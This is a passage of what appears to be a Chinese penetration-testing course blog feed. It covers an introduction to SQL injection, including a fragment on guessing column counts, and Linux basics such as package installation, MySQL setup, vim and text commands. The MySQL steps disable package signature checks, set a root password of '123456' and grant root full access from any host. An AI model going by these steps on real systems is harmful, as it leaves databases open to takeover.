字段名字  id  也可以 跟上数字 1 2 3 4 .。。。。。    猜解表的列数 知道表有几列  </code></pre></code><p><code></code></p></pre><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>1.1什么是SQL注入</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.1-shi-me-shi-sql-zhu-ru/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.1-shi-me-shi-sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p><a name="kS2Rv"></a></p><h1 id="SQL-注入（Injection）-概述"><a href="#SQL-注入（Injection）-概述" class="headerlink" title="SQL 注入（Injection） 概述"></a>SQL 注入（Injection） 概述</h1><p><img src="/../../../../assets/bfb7f935e7924e5ecb2615f5596d39ce/58c15b4123ff4377bf667232040551a4.png"><img src="file://C:/Users/ZQ/Desktop/SQL%E6%B3%A8%E5%85%A5/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%8A%82/images/1640755380996.png?lastModify=1644920493"><br>SQL注入即是指<a href="https://baike.baidu.com/item/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/2498090">web应用程序</a>对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的<a href="https://baike.baidu.com/item/SQL%E8%AF%AD%E5%8F%A5/5714895">SQL语句</a>，在管理员不知情的情况下实现非法操作，以此来实现欺骗<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8/613818">数据库服务器</a>执行非授权的任意查询，从而进一步得到相应的数据信息 <a name="PRVTG"></a></p><h3 id="web应用程序三层架构：视图层-业务逻辑层-数据访问层"><a href="#web应用程序三层架构：视图层-业务逻辑层-数据访问层" class="headerlink" title="web应用程序三层架构：视图层 + 业务逻辑层  + 数据访问层"></a>web应用程序三层架构：视图层 + 业务逻辑层  + 数据访问层</h3><p><img src="/../../../../assets/bfb7f935e7924e5ecb2615f5596d39ce/ed5994b0523a48ea91a9dd7df3629ac2.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-9-Linux软件安装</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-9-ruan-jian-an-zhuang/ke-shi-1-9-linux-ruan-jian-an-zhuang/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-9-ruan-jian-an-zhuang/ke-shi-1-9-linux-ruan-jian-an-zhuang/</url>
      
        <content type="html"><![CDATA[<p><a name="ChzHU"></a></p><h2 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h2><ol><li>软件为什么需要安装</li><li>脚本和程序的区别</li><li>Linux安装软件的几种方式</li><li>CentOS安装软件案例</li><li>Linux软件版本管理 <a name="sTB8S"></a></li></ol><h1 id="Windows软件安装流程"><a href="#Windows软件安装流程" class="headerlink" title="Windows软件安装流程"></a>Windows软件安装流程</h1><ol><li>安装检查</li><li>释放文件</li><li>复制可执行文件</li><li>DLL动态链接库/安装服务</li><li>注册表</li><li>开始菜单和快捷方式 <a name="csbUM"></a></li></ol><h2 id="Windows安装文件"><a href="#Windows安装文件" class="headerlink" title="Windows安装文件"></a>Windows安装文件</h2><p>.msi<br>.exe <a name="ROeDQ"></a></p><h2 id="Windows可执行程序"><a href="#Windows可执行程序" class="headerlink" title="Windows可执行程序"></a>Windows可执行程序</h2><p>.exe</p><p><a name="XNzGp"></a></p><h1 id="Linux可执行程序"><a href="#Linux可执行程序" class="headerlink" title="Linux可执行程序"></a>Linux可执行程序</h1><p>/bin<br>/sbin<br>/usr/bin<br>/usr/sbin <a name="GwsH5"></a></p><h2 id="脚本和程序的区别"><a href="#脚本和程序的区别" class="headerlink" title="脚本和程序的区别"></a>脚本和程序的区别</h2><p>不需要编译的: Javascript、 Python、 Ruby.<br>需要编译的: C、C++、Swift、 Kotlin、 Go.</p><p>解释型:边解释边执行<br>编译型:计算机可以直接执行</p><p><a name="zJQgj"></a></p><h1 id="Linux软件常见安装方式"><a href="#Linux软件常见安装方式" class="headerlink" title="Linux软件常见安装方式"></a>Linux软件常见安装方式</h1><p>源码编译(make)、rpm、deb、yum、apt、Docker……</p><p><a name="v68Oc"></a></p><h2 id="Linux主要派系"><a href="#Linux主要派系" class="headerlink" title="Linux主要派系"></a>Linux主要派系</h2><table><thead><tr><th>主要派系</th><th>Linux发型版</th><th>主要安装方式</th></tr></thead><tbody><tr><td>Redhat红帽派系</td><td>Redhat、CentOS、 Fedora等</td><td>make、rpm、 yum、dnf</td></tr><tr><td>Debian派系</td><td>Kali、Ubuntu等</td><td>deb、apt、 dpkg</td></tr><tr><td>FreeBSD系</td><td>FreeBSD</td><td>make、pkg、 ports</td></tr></tbody></table><p><a name="qdlUB"></a></p><h3 id="Redhat系"><a href="#Redhat系" class="headerlink" title="Redhat系"></a>Redhat系</h3><p><a name="CzrmI"></a></p><h4 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h4><p>下载源代码安装包文件</p><ul><li>步骤1: tar包解压缩</li></ul><p>用途:解压并释放源代码包到指定的目录</p><ul><li>步骤2/configure配置</li></ul><p>用途:设置安装目录、安装模块等选项</p><ul><li>步骤3:make编译</li></ul><p>用途:生成可执行的二进制文件</p><ul><li>步骤4: make install</li></ul><p>用途:复制二进制文件到系统，配置环境</p><p>配置并使用软件 <a name="VGVOU"></a></p><h4 id="rpm安装"><a href="#rpm安装" class="headerlink" title="rpm安装"></a>rpm安装</h4><p>RedHat Package Manager 软件包管理工具 <a name="zFHfU"></a></p><h5 id="rpm选项"><a href="#rpm选项" class="headerlink" title="rpm选项"></a>rpm选项</h5><table><thead><tr><th>操作</th><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>查询</td><td>rpm -qa</td><td></td></tr><tr><td>rpm -q 包名</td><td>q: query</td><td></td></tr><tr><td>安装</td><td>rpm -ivh 包名</td><td>i: install 安装</td></tr><tr><td>v: verbose 详细</td><td></td><td></td></tr><tr><td>h: hash 哈希</td><td></td><td></td></tr><tr><td>升级</td><td>rpm -Uvh 包名</td><td>U:安装或升级最新版</td></tr><tr><td>卸载</td><td>rpm -e 包名</td><td>需要先卸载依赖其的软件</td></tr></tbody></table><p><a name="z8SWP"></a></p><h4 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a>yum安装</h4><p>YUM (Yellow dog Updater, Modified)</p><p><a name="JsgZk"></a></p><h5 id="yum操作和选项"><a href="#yum操作和选项" class="headerlink" title="yum操作和选项"></a>yum操作和选项</h5><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>列表</td><td>yum list</td></tr><tr><td>yum list 包名</td><td></td></tr><tr><td>搜索</td><td>yum search 包名</td></tr><tr><td>安装</td><td>yum install 包名</td></tr><tr><td>升级</td><td>yum update 包名</td></tr><tr><td>卸载</td><td>yum remove 包名</td></tr><tr><td>更新所有软件</td><td>yum update</td></tr><tr><td>清除缓存</td><td>yum clean all</td></tr><tr><td>更新yum缓存</td><td>yum make cache</td></tr></tbody></table><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>-h</td><td>显示帮助信息</td></tr><tr><td>-y</td><td>对所有的提问都回答”yes”</td></tr><tr><td>-c</td><td>指定配置文件</td></tr><tr><td>-q</td><td>安静模式</td></tr><tr><td>-v</td><td>详细模式</td></tr></tbody></table><p><a name="ao8sV"></a></p><h5 id="DNF和YUM的区别"><a href="#DNF和YUM的区别" class="headerlink" title="DNF和YUM的区别"></a>DNF和YUM的区别</h5><p>DNF (Dandified YUM)</p><table><thead><tr><th>区别</th><th>DNF</th><th>YUM</th></tr></thead><tbody><tr><td>解析依赖关系</td><td>使用Libsolv</td><td>使用公开的API</td></tr><tr><td>API</td><td>有完整的API文档，能很容易地创建新功能</td><td>没有完整文档，创建新功能困难</td></tr><tr><td>开发语言</td><td>C、C++、Python编写</td><td>只用Ptyhon编写</td></tr><tr><td>使用范围</td><td>Fedora、RHEL 8、CentOS8、OEL 8、Mageia 6/7</td><td>RHEL 6/7、CentOS 6/7、OEL 6/7</td></tr><tr><td>扩展的支持</td><td>支持各种扩展</td><td>只支持基于Python的扩展</td></tr><tr><td>同步元数据</td><td>占用内存少</td><td>占用较多内存</td></tr><tr><td>更新</td><td>包中包含不相关的依赖，则不会更新</td><td>在没有验证的情况下更新软件包</td></tr><tr><td>存储库不可用</td><td>DNF将跳过它，并继续使用可用的存储库处理事务</td><td>YUM会立即停止</td></tr><tr><td>内核包的保护</td><td>DNF不提供，可以删除内核包</td><td>不允许你删除运行中的内核</td></tr></tbody></table><p><a name="bPNfV"></a></p><h3 id="Debian系"><a href="#Debian系" class="headerlink" title="Debian系"></a>Debian系</h3><p>Deb包安装<br>apt安装</p><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>搜索</td><td>apt search 包名</td></tr><tr><td>安装</td><td>apt install 包名</td></tr><tr><td>升级</td><td>apt update 包名</td></tr><tr><td>卸载</td><td>apt remove 包名</td></tr></tbody></table><p><a name="DKDQ1"></a></p><h3 id="FreeBSD系"><a href="#FreeBSD系" class="headerlink" title="FreeBSD系"></a>FreeBSD系</h3><p>package<br>ports</p><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>搜索</td><td>pkg search 包名</td></tr><tr><td>安装</td><td>pkg install 包名</td></tr><tr><td>升级</td><td>pkg upgrade 包名</td></tr><tr><td>卸载</td><td>pkg del 包名</td></tr></tbody></table><p><a name="UBaPW"></a></p><h1 id="Linux软件安装方式案例"><a href="#Linux软件安装方式案例" class="headerlink" title="Linux软件安装方式案例"></a>Linux软件安装方式案例</h1><p><a name="YfyzB"></a></p><h2 id="CentOS启用中文输入法"><a href="#CentOS启用中文输入法" class="headerlink" title="CentOS启用中文输入法:"></a>CentOS启用中文输入法:</h2><p><a href="https://blog.csdn.net/qq_30273575/article/details/125097771">https://blog.csdn.net/qq_30273575/article/details/125097771</a> <a name="ehWZc"></a></p><h2 id="CentOS-yum安装MySQL"><a href="#CentOS-yum安装MySQL" class="headerlink" title="CentOS yum安装MySQL:"></a>CentOS yum安装MySQL:</h2><p><a href="https://blog.csdn.net/weixin_44436964/article/details/123845958">https://blog.csdn.net/weixin_44436964/article/details/123845958</a> <a name="Aup3A"></a></p><h3 id="一、卸载MYSQL"><a href="#一、卸载MYSQL" class="headerlink" title="一、卸载MYSQL"></a>一、卸载MYSQL</h3><p><a name="cQsmE"></a></p><h4 id="1-先确认创建的CentOS中是否含有其他软件包"><a href="#1-先确认创建的CentOS中是否含有其他软件包" class="headerlink" title="1.先确认创建的CentOS中是否含有其他软件包"></a>1.先确认创建的CentOS中是否含有其他软件包</h4><pre><code>rpm -qa | grep mysql 查mysql相关软件包rpm -e xxx  卸载查询的软件包</code></pre><p>问题：出现已另存的警告时，将另存的单独删除，删除语法：&amp;#x20;<br><code>rm-f /etc/my.cnf.rpmsave</code> <a name="FC0hi"></a></p><h4 id="2-删除相关的文件和目录"><a href="#2-删除相关的文件和目录" class="headerlink" title="2.删除相关的文件和目录"></a>2.删除相关的文件和目录</h4><pre><code>find / -name mysql 查询文件或目录 rm -rf xxx 删除相关文件或目录 </code></pre><p><a name="mDAPs"></a></p><h4 id="3-清楚rpm缓存"><a href="#3-清楚rpm缓存" class="headerlink" title="3.清楚rpm缓存"></a>3.清楚rpm缓存</h4><pre><code>yum clean all  清理本地缓存</code></pre><p><a name="EKPR5"></a></p><h3 id="二、mysql部署"><a href="#二、mysql部署" class="headerlink" title="二、mysql部署"></a>二、mysql部署</h3><p><a name="GXM3J"></a></p><h4 id="1-mysql安装"><a href="#1-mysql安装" class="headerlink" title="1. mysql安装"></a>1. mysql安装</h4><pre><code>1.下载mysql安装源文件wget 'https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm'2.安装mysql的yum源文件rpm -Uvh mysql57-community-release-el7-11.noarch.rpm3.安装mysqlyum -y install mysql-community-server4.启动mysql服务systemctl start mysqld5.添加MySQL服务到开机启动systemctl enable mysqld</code></pre><p>问题：安装第三步时报错密钥不匹配<br>解决：打开<code>/etc/yum.repos.d/mysql-community.repo</code>,更改对应版本的<code>gpgcheck=0</code> <a name="AjHCi"></a></p><h4 id="2-修改mysql默认的密码"><a href="#2-修改mysql默认的密码" class="headerlink" title="2.修改mysql默认的密码"></a>2.修改mysql默认的密码</h4><pre><code>1. 查看源码安装的MySQL的密码grep 'temporary password' /var/log/mysqld.log2. 在Linux下登录mysql服务器mysql -uroot -p上一步的临时密码,有特殊字符时需采用复制粘贴的方式3. 设置mysql数据密码策略set global validate_password_policy=0;set global validate_password_length=1;4. 修改数据库密码set password for root@localhost = password('123456');</code></pre><p><a name="EBUvI"></a></p><h4 id="3-修改mysql远程连接的权限"><a href="#3-修改mysql远程连接的权限" class="headerlink" title="3.修改mysql远程连接的权限"></a>3.修改mysql远程连接的权限</h4><pre><code>1. 切换到mysql库use mysql;2. 查看主机及用户信息select host,user from user;3. 赋予任何主机访问数据的权限grant all privileges on *.* to 'root'@'%' identified by 'AbCd@123456' with grant option;4. 刷新权限使其生效flush privileges;</code></pre><h1 id="查询3306端口是否开放firewall-cmd-query-port-3306-tcp-开放3306端口firewall-cmd-permanent-add-port-3306-tcpfirewall-cmd-permanent-add-port-3300-3310-tcp-移除端口firewall-cmd-permanent-remove-port-3306-tcp查看防火墙的开放的端口-firewall-cmd-permanent-list-ports重启防火墙firewall-cmd-reload"><a href="#查询3306端口是否开放firewall-cmd-query-port-3306-tcp-开放3306端口firewall-cmd-permanent-add-port-3306-tcpfirewall-cmd-permanent-add-port-3300-3310-tcp-移除端口firewall-cmd-permanent-remove-port-3306-tcp查看防火墙的开放的端口-firewall-cmd-permanent-list-ports重启防火墙firewall-cmd-reload" class="headerlink" title="查询3306端口是否开放firewall-cmd --query-port=3306/tcp# 开放3306端口firewall-cmd --permanent --add-port=3306/tcpfirewall-cmd --permanent --add-port=3300-3310/tcp# 移除端口firewall-cmd --permanent --remove-port=3306/tcp查看防火墙的开放的端口 :firewall-cmd --permanent&nbsp;--list-ports重启防火墙firewall-cmd --reload"></a>查询3306端口是否开放<br><code>firewall-cmd --query-port=3306/tcp</code><br># 开放3306端口<br><code>firewall-cmd --permanent --add-port=3306/tcp</code><br><code>firewall-cmd --permanent --add-port=3300-3310/tcp</code><br># 移除端口<br><code>firewall-cmd --permanent --remove-port=3306/tcp</code><br>查看防火墙的开放的端口 :<br><code>firewall-cmd --permanent&nbsp;--list-ports</code><br>重启防火墙<br><code>firewall-cmd --reload</code></h1><p><a name="b2OC0"></a></p><h3 id="Linux命令搜索引擎命令搭建"><a href="#Linux命令搜索引擎命令搭建" class="headerlink" title="Linux命令搜索引擎命令搭建"></a>Linux命令搜索引擎命令搭建</h3><p><a href="https://github.com/jaywcjlove/linux-command">https://github.com/jaywcjlove/linux-command</a> <a name="PrCAz"></a></p><h4 id="先安装Docker"><a href="#先安装Docker" class="headerlink" title="先安装Docker"></a>先安装Docker</h4><pre><code>apt install docker.ioapt install podman-docker</code></pre><p><a name="JuI7z"></a></p><h4 id="通过Docker安装"><a href="#通过Docker安装" class="headerlink" title="通过Docker安装"></a>通过Docker安装</h4><p>轻松通过 docker 部署 linux-command 网站。</p><pre><code>docker pull wcjiang/linux-command # Or docker pull ghcr.io/jaywcjlove/linux-command:latest</code></pre><!----><pre><code>docker run --name linux-command --rm -d -p 9665:3000 wcjiang/linux-command:latest # Or docker run --name linux-command -itd -p 9665:3000 wcjiang/linux-command:latest # Or docker run --name linux-command -itd -p 9665:3000 ghcr.io/jaywcjlove/linux-command:latest</code></pre><p><a name="qQQET"></a></p><h4 id="在浏览器中访问以下-URL"><a href="#在浏览器中访问以下-URL" class="headerlink" title="在浏览器中访问以下 URL"></a>在浏览器中访问以下 URL</h4><p><strong><a href="http://localhost:9665/">http://localhost:9665/</a></strong><br><code>http://192.168.31.76:9665</code></p><p><a name="xKMMh"></a></p><h1 id="软件版本管理"><a href="#软件版本管理" class="headerlink" title="软件版本管理"></a>软件版本管理</h1><p><a name="IHHxG"></a></p><h2 id="update-alternatives"><a href="#update-alternatives" class="headerlink" title="update-alternatives"></a>update-alternatives</h2><ul><li>查看:</li></ul><!----><pre><code>update- alternatives --display java</code></pre><ul><li>添加:</li></ul><!----><pre><code>alternatives --install /usr/bin/java java /usr/local/jdk-11.0.2/bin/java 3</code></pre><p><code>/usr/bin/java</code>: 注册地址，软链<br><code>java</code>:服务名<br><code>/usr/local/jdk-11.0.2/bin/java</code>:实际程序路径<br><code>3</code>:优先级</p><ul><li>切换:</li></ul><!----><pre><code>update-alternatives --config java </code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-8-Linux文本编辑器</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-8-wen-ben-bian-ji-qi/ke-shi-1-8-linux-wen-ben-bian-ji-qi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-8-wen-ben-bian-ji-qi/ke-shi-1-8-linux-wen-ben-bian-ji-qi/</url>
      
        <content type="html"><![CDATA[<p><a name="zxQ38"></a></p><h2 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h2><p>Windows: Notepad (记事本)、Sublime、 UltraEdit等<br>Linux: VI/VIM、 nano、Emacs、Sed、 gedit、 Kate等</p><p><a name="mxYbZ"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>VI和VIM的区别</li><li>VIM配置文件</li><li>VIM三种模式的关系</li><li>命令模式</li><li>编辑模式</li><li>底行模式 <a name="iXRZA"></a></li></ol><h1 id="VI和VIM的区别"><a href="#VI和VIM的区别" class="headerlink" title="VI和VIM的区别"></a>VI和VIM的区别</h1><ul><li>VI: Visual Interface</li><li>1976 Bill Joy(ex)</li><li>1991 Bram Moolenaar</li><li>Vim: VI IMproved</li></ul><p>vim语法高亮 <a name="jQX1Q"></a></p><h1 id="VIM配置文件"><a href="#VIM配置文件" class="headerlink" title="VIM配置文件"></a>VIM配置文件</h1><p>全局配置: <code>/etc/vimrc</code><br>用户配置: ~/.vimrc<br>详细配置参考:<br><a href="https://blog.csdn.net/xiao_yi_xiao/article/details/118491698">https://blog.csdn.net/xiao_yi_xiao/article/details/118491698</a> <a name="XKNi5"></a></p><h1 id="VIM三种模式切换"><a href="#VIM三种模式切换" class="headerlink" title="VIM三种模式切换"></a>VIM三种模式切换</h1><p><img src="/../../../../assets/fdngr26334cckpx7_xol247/1668312690746-f16ae486-e981-4adb-8222-e1fb420613bb.png" alt="image.png"> <a name="kiyGK"></a></p><h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><p><a name="ik7BW"></a></p><h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><p>VIM 文件名<br>vim /etc/sysconfig/network-scripts/ifcfg-ens33<br>vim redis.conf</p><p>错误提示:<br>E325: ATTENTION<br>Found a swap file by the name “.redis.conf.swp”<br>原因:编辑未结束<br>解决办法:保存文本文件，或者删除.swp <a name="h9qjT"></a></p><h3 id="移动光标操作"><a href="#移动光标操作" class="headerlink" title="移动光标操作"></a>移动光标操作</h3><table><thead><tr><th>操作</th><th>按键</th></tr></thead><tbody><tr><td>移动光标</td><td>方向键↑ ↓ ← →</td></tr><tr><td>跳到行首</td><td>HOME</td></tr><tr><td>跳到行尾</td><td>END</td></tr><tr><td>向后前进多少行</td><td>n数字</td></tr><tr><td>退出前进一屏(Forward)</td><td>Ctrl+F</td></tr><tr><td>后退一屏(Backspace)</td><td>Ctrl+B</td></tr><tr><td>跳到文档末尾</td><td>Shift+G  /  G</td></tr><tr><td>跳到文档开头</td><td>:1 / gg</td></tr></tbody></table><p>显示文件行号：set number</p><p><a name="xoeKW"></a></p><h3 id="搜索替换操作"><a href="#搜索替换操作" class="headerlink" title="搜索替换操作"></a>搜索替换操作</h3><table><thead><tr><th>操作</th><th>按键</th></tr></thead><tbody><tr><td>向后查找内容</td><td>/关键字，回车</td></tr><tr><td>向前查找内容</td><td>?关键字，回车</td></tr><tr><td>n</td><td>下一个关键字</td></tr><tr><td>N</td><td>上一个关键字</td></tr></tbody></table><p><a name="QEfuB"></a></p><h3 id="删除和复制操作"><a href="#删除和复制操作" class="headerlink" title="删除和复制操作"></a>删除和复制操作</h3><table><thead><tr><th>操作</th><th>按键</th></tr></thead><tbody><tr><td>复制光标所在行</td><td>yy</td></tr><tr><td>粘贴到下一行/上一行</td><td>p / P</td></tr><tr><td>删除光标前面一个字符</td><td>X</td></tr><tr><td>删除光标后面1个字符</td><td>Del/x</td></tr><tr><td>删除一行</td><td>dd</td></tr><tr><td>删除光标下面n行</td><td>ndd</td></tr><tr><td>重复上一次的操作</td><td>.</td></tr><tr><td>撤消最近一次操作</td><td>u</td></tr><tr><td>恢复最近一次操作</td><td>Ctrl+ R</td></tr></tbody></table><p><a name="gY4bR"></a></p><h2 id="编辑模式"><a href="#编辑模式" class="headerlink" title="编辑模式"></a>编辑模式</h2><p><a name="AejkP"></a></p><h3 id="进入编辑模式"><a href="#进入编辑模式" class="headerlink" title="进入编辑模式"></a>进入编辑模式</h3><p>a:在光标下一个字符之前插入文本<br>A:在光标所在的航模插入文本<br>i: 在光标上一个字符之前插入文本<br>l:在光标的行首插入文本<br>o:在光标所在的行下插入- -行文本<br>O:在光标所在的行上插入- -行文本<br>r:修改当前光标所在的字符<br>R:替换文本</p><p><a name="aUHiP"></a></p><h3 id="撤消"><a href="#撤消" class="headerlink" title="撤消"></a>撤消</h3><p>编辑模式下: Ctrl+U 撤消<br>退出编辑模式: Esc</p><p><a name="I2lvO"></a></p><h2 id="进入底行模式"><a href="#进入底行模式" class="headerlink" title="进入底行模式"></a>进入底行模式</h2><p>Shift + :<br><code>:w</code>保存<br><code>:q</code>退出<br><code>:wq</code>保存并且保存<br><code>:q!</code>放弃修改，退出<br>:e!放弃所有更改，重新编辑(不关闭</p><p>显示行号:   <code> :set nu</code><br>:%s/word1/word2/g 把文档中的word1替换为word2</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-7-查看和处理文件内容</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-7-cha-kan-he-chu-li-wen-jian-nei-rong/ke-shi-1-7-cha-kan-he-chu-li-wen-jian-nei-rong/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-7-cha-kan-he-chu-li-wen-jian-nei-rong/ke-shi-1-7-cha-kan-he-chu-li-wen-jian-nei-rong/</url>
      
        <content type="html"><![CDATA[<p><a name="et6yQ"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>cat：查看</li><li>more/less</li><li>head/tail</li><li>grep、 管道符号</li><li>wc:统计</li><li>diff：对比 <a name="Pov4G"></a></li></ol><h2 id="文本文件"><a href="#文本文件" class="headerlink" title="文本文件"></a>文本文件</h2><ul><li>ASCII、UTF-8、 Unicode、 ANSI</li><li>txt、xml、 conf、properties、 yml等配置文件、日志文件、源代码 <a name="Yj3JF"></a></li></ul><h2 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h2><ul><li>可执行程序、图片、音频、视频 <a name="maBWB"></a></li></ul><h1 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h1><p>全拼: concatenate [kon’ kaetanert] 连接<br>格式: cat 文件名 <a name="b6Jij"></a></p><h1 id="more-x2F-less"><a href="#more-x2F-less" class="headerlink" title="more/less"></a>more/less</h1><table><thead><tr><th>操作</th><th>按键</th></tr></thead><tbody><tr><td>分页查看</td><td>more redis.conf</td></tr><tr><td>第三行开始显示</td><td>more +3 test.log</td></tr><tr><td>从出现wuya开始显示</td><td>more +/wuya test.log</td></tr></tbody></table><p><a name="Ou6Fk"></a></p><h2 id="more-x2F-less分屏操作"><a href="#more-x2F-less分屏操作" class="headerlink" title="more/less分屏操作"></a>more/less分屏操作</h2><table><thead><tr><th>操作</th><th>按键</th></tr></thead><tbody><tr><td>下一行</td><td>Enter、箭头下</td></tr><tr><td>上一行</td><td>y、箭头上</td></tr><tr><td>下一屏</td><td>Space空格/CtrI+F</td></tr><tr><td>上一屏</td><td>b</td></tr><tr><td>退出</td><td>q / ctrl + c /ZZ</td></tr></tbody></table><p><a name="WQIJV"></a></p><h2 id="more-x2F-less搜索"><a href="#more-x2F-less搜索" class="headerlink" title="more/less搜索"></a>more/less搜索</h2><p>/[查找字符] # 配合n键，从上往下查所有。<br>?[查找字符] # 配合n键，从下往上查所有。<br>按Enter键后:<br>n键盘查找下一个符合的内容。<br>N上一个符合的内容。 <a name="eWVGm"></a></p><h1 id="head-x2F-tail-实时显示"><a href="#head-x2F-tail-实时显示" class="headerlink" title="head/tail 实时显示"></a>head/tail 实时显示</h1><p>前10行：head -n 10 redis.conf<br>末尾10行：tail-n 10 info.log<br>显示末尾实时最新的内容：tail -f /var/log/messages</p><p><a name="IN0VU"></a></p><h1 id="grep-全局搜索"><a href="#grep-全局搜索" class="headerlink" title="grep 全局搜索"></a>grep 全局搜索</h1><p>全拼: Globally search a Regular Expression and Print<br>全局搜索正则表达式并打印</p><p>格式:grep 选项 模式 文件名 <a name="mnfWm"></a></p><h1 id="管道符号pipe"><a href="#管道符号pipe" class="headerlink" title="管道符号pipe"></a>管道符号pipe</h1><p>把前一个命令原本要输出到屏幕的数据当作是后一个命令的标准输入</p><p>command1 | command2 | command3<br>cat test.log | more -5每次显示5行<br>ps -ef | less -N显示行号</p><p>netstat -an | grep 3306<br>cat -n info.log | grep “debug” | more <a name="d0JYM"></a></p><h1 id="wc-统计"><a href="#wc-统计" class="headerlink" title="wc 统计"></a>wc 统计</h1><p>全拼: word count<br>-l或–lines 显示行数<br>-w或–words只显示字数<br>wc -l redis.conf<br>wc -w redis.conf <a name="qtXTD"></a></p><h1 id="diff-对比"><a href="#diff-对比" class="headerlink" title="diff 对比"></a>diff 对比</h1><p>全拼: different<br>文件内容差异：diff diff_A.txt diff_B.txt<br>目录差异：diff -r aaa bbb</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-6-文件压缩及解压缩</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-6-wen-jian-ya-suo-ji-jie-ya-suo/ke-shi-1-6-wen-jian-ya-suo-ji-jie-ya-suo/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-6-wen-jian-ya-suo-ji-jie-ya-suo/ke-shi-1-6-wen-jian-ya-suo-ji-jie-ya-suo/</url>
      
        <content type="html"><![CDATA[<p>课程大纲</p><ol><li>打包和压缩的区别</li><li>常见压缩格式</li><li>tar命令</li><li>zip命令 <a name="fzA4B"></a></li></ol><h1 id="打包和压缩的区别"><a href="#打包和压缩的区别" class="headerlink" title="打包和压缩的区别"></a>打包和压缩的区别</h1><p>打包:多个文件变成一个文件——减少文件个数<br>压缩:缩小一个文件的体积——减少文件体积 <a name="H6loX"></a></p><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><p>打包/解包 pack/unpack <a name="N0eDL"></a></p><h2 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h2><p>压缩/解压compress/decompress<br>图片: BMP、GIF、 PNG、JPEG、 JPG<br>音频: APE、FLAC、 MP3<br>视频: RMVB、AVI、 MP4</p><p>压缩率:压缩后体积/压缩前体积</p><p><a name="ZZ854"></a></p><h2 id="其他作用"><a href="#其他作用" class="headerlink" title="其他作用"></a>其他作用</h2><p>添加密码<br>注意:打包、解包、压缩、解压都需要消耗时间 <a name="UI3zs"></a></p><h1 id="常见压缩格式"><a href="#常见压缩格式" class="headerlink" title="常见压缩格式"></a>常见压缩格式</h1><ul><li>HTTP: gzip</li></ul><p>gzip、deflate(zlib的格式)、 br(Brotli)、 identity(不压缩)</p><ul><li>Windows: zip、rar、7zip</li></ul><p>winrar、360压缩、bandzip、 7zip</p><ul><li>Linux: gzip (tar.gz=.tgz) 、bzip2 (.bz2)、zip</li></ul><p>tgz打包后压缩，默认压缩算法bzip2<br>tar:Tape Archive(磁带归档)</p><p>压缩后体积: tar.bz2 &lt; tgz &lt; tar<br>压缩解压时间: tar.bz2 &gt; tar &gt; tgz <a name="GPJxt"></a></p><h2 id="tar常用选项"><a href="#tar常用选项" class="headerlink" 